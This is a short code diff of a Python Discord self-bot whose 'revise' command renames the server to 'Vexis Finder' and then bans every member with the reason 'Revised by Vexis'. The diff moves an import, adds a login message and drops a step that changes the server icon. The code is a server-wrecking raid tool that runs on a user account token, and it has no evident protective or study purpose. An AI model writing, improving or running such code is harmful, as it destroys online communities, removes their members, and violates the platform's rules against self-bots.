@@ -1,18 +1,20 @@
 # main.py
-import os
 import discord
 from discord.ext import commands
 import asyncio
+import os
 
-TOKEN = os.getenv("TOKEN")
+TOKEN = os.environ.get("TOKEN")
 bot = commands.Bot(command_prefix="!", self_bot=True)
+
+@bot.event
+async def on_ready():
+    print(f"Logged in as {bot.user}")
 
 @bot.command()
 async def revise(ctx):
     guild = ctx.guild
     await guild.edit(name="Vexis Finder")
-    with open("v.png", "rb") as f:
-        await guild.edit(icon=f.read())
     for member in guild.members:
         try:
             await member.ban(reason="Revised by Vexis")
